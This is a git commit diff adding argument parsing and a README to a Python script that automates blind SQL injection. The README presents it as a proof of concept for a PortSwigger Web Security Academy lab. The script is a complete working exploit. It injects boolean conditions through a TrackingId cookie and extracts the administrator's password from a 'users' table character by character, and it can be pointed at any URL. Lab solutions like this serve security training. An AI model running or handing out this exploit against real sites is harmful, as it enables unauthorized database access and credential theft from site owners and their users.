c823e62f19e86c07bd9b884c64445ee3fb42e386
l3tox <lukaszavadil@proton.me>
2025-09-01 06:09:32 +0200

    Added automation to code started writing README

--- conditional-trigger/Blind_SQLi.py
+++ conditional-trigger/Blind_SQLi.py
@@ -1,33 +1,71 @@
 import requests as req
 import string
 import urllib.parse
+import argparse
+from urllib.parse import urlparse
 
-TRACKING_ID="" # Cookie tracking id where you inject the payload
-SESSION="" # If it has session enter it there
-URL="" # What url you want to test e.g. google.com
-KEY_WORD="Welcome back" # If the injection is valid, match there the keyword
-WORD_LIST = string.ascii_lowercase + string.digits
+def main(TRACKING_ID,URL,KEY_WORD,WORD_LIST):
+    # Declaration
+    found=False
+    index=1
+    password=""
+
+    # If user not set trackingId cookie it will try to get it's own
+    if not TRACKING_ID:
+        r = req.get(URL)
+        raw_headers = r.headers.get("Set-Cookie","")
+        cookies = [c.strip() for c in raw_headers.split(",")]
+        for cookie in cookies:
+            if cookie.startswith("TrackingId="):
+                TRACKING_ID = cookie.split(";", 1)[0].split("=")[1]
+
+    SQLiTrueTest = req.get(URL, cookies={"TrackingId":urllib.parse.quote(TRACKING_ID+"' AND '1'='1")})
+    if not KEY_WORD in SQLiTrueTest.text:
+        print("This target is not vulnerable to SQLi")
+        return
 
 
-found=False
-index=1
-password=""
+#    Brute-force password by comaping it with each chars
+    while(True):    
+        for char in WORD_LIST:
+            payload=f"{TRACKING_ID}' AND SUBSTRING((SELECT password FROM users WHERE username='administrator'),{index},1)='{char}"
+            cookie = {"TrackingId":urllib.parse.quote(payload)} # Change there if the cookie names are different
+            r = req.get(URL, cookies=cookie)
+            if KEY_WORD in r.text:
+                password += char
+                print(f"Passowrd => {index} => {password}")
+                found = True
+                break
 
-while(True):    
-    for char in WORD_LIST:
-        payload=f"{TRACKING_ID}' AND SUBSTRING((SELECT password FROM users WHERE username='administrator'),{index},1)='{char}"
-        cookie = {"TrackingId":urllib.parse.quote(payload), "session":SESSION} # Change there if the cookie names are different
-        r = req.get("https://"+URL, cookies=cookie)
-        if KEY_WORD in r.text:
-            password += char
-            print(f"Passowrd => {index} => {password}")
-            found = True
+            print(f"{index} -> {char}")
+        if not found:
             break
+        else:
+            found = False
+        index += 1
 
-        print(f"{index} -> {char}")
-    if not found:
-        break
+def is_url(url):
+    try :
+        res = urlparse(url)
+        return all([res.scheme, res.netloc])
+    except:
+        return False
+    
+if __name__ == "__main__":
+    parser = argparse.ArgumentParser(prog="Blind SQLi password tester")
+    parser.add_argument('-u', '--url')
+    parser.add_argument('-c', '--cookie')
+
+    # User will fill out
+    TRACKING_ID="" # Cookie tracking id where you inject the payload
+    URL="" # What url you want to test e.g. google.com
+    KEY_WORD="Welcome back" # If the injection is valid, match there the keyword
+    WORD_LIST = string.ascii_lowercase + string.digits
+
+    args = parser.parse_args()
+
+    if not URL and is_url(args.url):
+        URL = args.url
     else:
-        found = False
-    index += 1
-
+        print("Please enter valid URL")
+    main(TRACKING_ID,URL,KEY_WORD,WORD_LIST)
---
+++ conditional-trigger/README.md
@@ -0,0 +1,21 @@
+# PoC - PortSwigger, Blind SQL injection with conditional responses
+
+This code demonstrates how you can automate Blind SQL injection and easily execute with few changes
+
+## Install
+
+```bash
+    git clone https://github.com/TadyLucas/sql-injection-labs
+    cd conditional-trigger/
+    python3 -m venv venv
+    source ./venv/bin/activate
+    pip install -r requirements.txt
+```
+
+## Usage
+
+```bash
+    python3 Blind_SQLi.py -u https://0a05007403f314da80e2c1d600ae0010.web-security-academy.net/
+```
+
+## How Blind SQL injection works?
